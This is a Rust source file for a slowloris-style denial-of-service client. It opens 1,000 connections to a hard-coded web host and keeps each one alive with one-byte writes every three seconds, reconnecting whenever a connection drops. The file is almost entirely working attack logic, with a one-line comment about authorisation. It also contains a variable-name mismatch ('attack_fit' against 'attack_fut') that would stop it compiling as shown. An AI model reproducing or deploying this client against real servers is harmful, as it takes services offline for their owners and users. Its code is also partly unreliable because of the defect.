// My stupid slow loris based DoS client(?)
// Don't use it on servers that you don't have authorization
// Copyright (C) 2020  Aravinth Manivannan <realaravinth@batsense.net>
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU Affero General Public License as
// published by the Free Software Foundation, either version 3 of the
// License, or (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU Affero General Public License for more details.

// You should have received a copy of the GNU Affero General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.

#![warn(rust_2018_idioms)]
use pretty_env_logger;
#[macro_use]
extern crate log;

use tokio::io::AsyncWriteExt;
use tokio::net::TcpStream;

use futures::future;

#[tokio::main]
async fn main() {
    pretty_env_logger::init();
    let mut attack_fit = Vec::new();

    info!("Creating futures");

    for _ in 0..1_000 {
        attack_fut.push(attack());
    }
    info!("Created futures");
    future::join_all(attack_fut).await;
}

async fn get_conn() -> TcpStream {
    let mut inbound = TcpStream::connect("stealth.batsense.net:80").await;
    loop {
        match &inbound {
            Err(_) => {
                inbound = TcpStream::connect("stealth.batsense.net:80").await;
                continue;
            }
            Ok(_) => break,
        }
    }
    inbound.unwrap()
}

async fn attack() {
    use tokio::time::{sleep, Duration};
    let mut inbound = get_conn().await;
    let time = Duration::from_millis(3 * 1_000);
    loop {
        let message = "G".as_bytes();
        match inbound.write(message).await {
            Err(_) => inbound = get_conn().await,
            _ => (),
        };
        sleep(time).await;
    }
}
